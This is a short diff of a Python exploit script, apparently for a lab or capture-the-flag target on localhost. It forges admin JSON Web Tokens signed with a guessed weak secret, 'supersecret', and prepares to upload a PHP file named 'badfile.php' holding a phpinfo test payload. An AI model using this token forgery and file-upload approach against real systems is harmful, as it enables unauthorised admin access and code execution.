@@ -6,10 +6,10 @@ import time
 
 ##############################################
 ###################CONFIG#####################
-URL = "ur url here"
+URL = "http://127.0.0.1"
 filename_to_upload = "badfile.php"
 file_content = "<?php phpinfo(); ?>"
-user_id = 31337
+user_id = 61334
 is_public = 0
 
 timeout = 2
@@ -36,9 +36,7 @@ def generate_token(id):
     return encoded_jwt
 
 def get_last_id():
-    encoded_jwt = jwt.encode({"id": f'{user_id}',"login": "lol123",
-                              "mail": "lol123",  "role": "admin",  "ip": "127.0.0.1"},
-                              "supersecret", algorithm="HS256")
+    encoded_jwt = generate_token(user_id)
     req = requests.get(f"{URL}", headers={"Cookie": f"user_token={encoded_jwt}"})
     images = re.findall(r"image\.php\?id=[0-9]{1,7}",req.text)
     last_id = str(images[len(images)-1])[13:]
